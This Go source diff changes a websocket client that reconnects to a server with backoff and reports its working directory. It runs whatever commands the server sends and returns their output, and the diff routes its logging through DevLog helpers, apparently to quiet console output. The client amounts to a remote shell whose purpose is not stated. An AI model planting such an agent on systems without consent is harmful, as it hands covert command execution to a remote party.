@@ -2,8 +2,6 @@ package main
 
 import (
 	"encoding/json"
-	"fmt"
-	"log"
 	"math/rand"
 	"net/url"
 	"os"
@@ -23,11 +21,11 @@ func main() {
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	for {
-		fmt.Println("Connecting to:", u.String())
+		DevLog("Connecting to:", u.String())
 
 		conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
 		if err != nil {
-			log.Println("dial failed:", err)
+			DevLog("dial failed:", err)
 			// Exponential backoff with jitter
 			backoffCounter++
 			if backoffCounter > 10 {
@@ -38,7 +36,7 @@ func main() {
 			jitter := time.Duration(rng.Int63n(int64(backoffDuration / 5)))
 			backoffDuration = backoffDuration + jitter - backoffDuration/10
 
-			log.Printf("Retrying in %v...\n", backoffDuration)
+			DevLogf("Retrying in %v...\n", backoffDuration)
 			time.Sleep(backoffDuration)
 			continue
 		}
@@ -46,20 +44,20 @@ func main() {
 		// Reset backoff on successful connection
 		backoffCounter = 0
 
-		fmt.Println("Connected!")
+		DevLog("Connected!")
 
 		// Send initial message
 		dir, _ := os.Getwd()
 		currentWorkingDir = dir
 		if err := sendMessage(conn, "CREATE_CONNECTION", dir); err != nil {
-			log.Println("Failed to send initial message:", err)
+			DevLog("Failed to send initial message:", err)
 			conn.Close()
 			continue // don't sleep here, let exponential backoff handle it
 		}
 
 		// Read until disconnected
 		if err := handleConnection(conn); err != nil {
-			log.Println("Connection error:", err)
+			DevLog("Connection error:", err)
 		}
 
 		conn.Close()
@@ -76,7 +74,7 @@ func handleConnection(conn *websocket.Conn) error {
 		_, msgBytes, err := conn.ReadMessage()
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
-				log.Printf("websocket error: %v", err)
+				DevLogf("websocket error: %v", err)
 			}
 			return err
 		}
@@ -86,11 +84,11 @@ func handleConnection(conn *websocket.Conn) error {
 
 		var incoming Message
 		if err := json.Unmarshal(msgBytes, &incoming); err != nil {
-			log.Println("⚠️ Invalid JSON:", err)
+			DevLog("⚠️ Invalid JSON:", err)
 			continue
 		}
 
-		log.Println("Received message:", incoming.Type)
+		DevLog("Received message:", incoming.Type)
 
 		// Filter messages: only process if meant for this device or broadcast
 		if incoming.DeviceId != "" && incoming.DeviceId != generateDeviceID() {
@@ -106,13 +104,13 @@ func handleConnection(conn *websocket.Conn) error {
 func processMessage(conn *websocket.Conn, msg Message) {
 	switch msg.Type {
 	case "EXECUTE_COMMAND":
-		log.Println("Executing command:", msg.Content)
+		DevLog("Executing command:", msg.Content)
 		output := executeCommand(msg.Content)
 		if err := sendMessage(conn, "GET_COMMAND_OUTPUT", output); err != nil {
-			log.Println("Failed to send command output:", err)
+			DevLog("Failed to send command output:", err)
 		}
 
 	default:
-		log.Println("Unknown message type:", msg.Type)
+		DevLog("Unknown message type:", msg.Type)
 	}
 }
